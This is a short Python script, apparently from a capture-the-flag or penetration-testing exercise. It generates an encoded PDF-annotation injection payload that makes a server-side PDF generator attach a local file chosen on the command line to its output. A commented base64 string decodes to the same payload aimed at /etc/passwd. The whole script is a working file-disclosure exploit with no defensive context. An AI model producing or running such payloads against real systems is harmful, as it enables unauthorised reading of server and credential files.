from base64 import b64encode, b64decode
from urllib.parse import quote_plus, unquote_plus
import sys

# PDF = 'JTI1M0Nhbm5vdGF0aW9uJTJCZmlsZSUyNTNEJTI1MjIlMjUyRmV0YyUyNTJGcGFzc3dkJTI1MjIlMkJjb250ZW50JTI1M0QlMjUyMiUyNTJGZXRjJTI1MkZwYXNzd2QlMjUyMiUyQmljb24lMjUzRCUyNTIyR3JhcGglMjUyMiUyQnRpdGxlJTI1M0QlMjUyMkF0dGFjaGVkJTJCRmlsZSUyNTNBJTJCJTI1MkZldGMlMjUyRnBhc3N3ZCUyNTIyJTJCcG9zLXglMjUzRCUyNTIyMzIlMjUyMiUyQnBvcy15JTI1M0QlMjUyMjMyJTI1MjIlMkIlMjUyRiUyNTNF'
FILE = sys.argv[1]
PAYLOAD = '<annotation file="{target}" content="{target}" icon="Graph" title="Attached File: {target}" pos-x="32" pos-y="32" />'.format(target=FILE)

# print(unquote_plus(unquote_plus(b64decode(PDF).decode('utf-8'))))
print(b64encode(quote_plus(quote_plus(PAYLOAD)).encode('utf-8')).decode('utf-8'), end="")
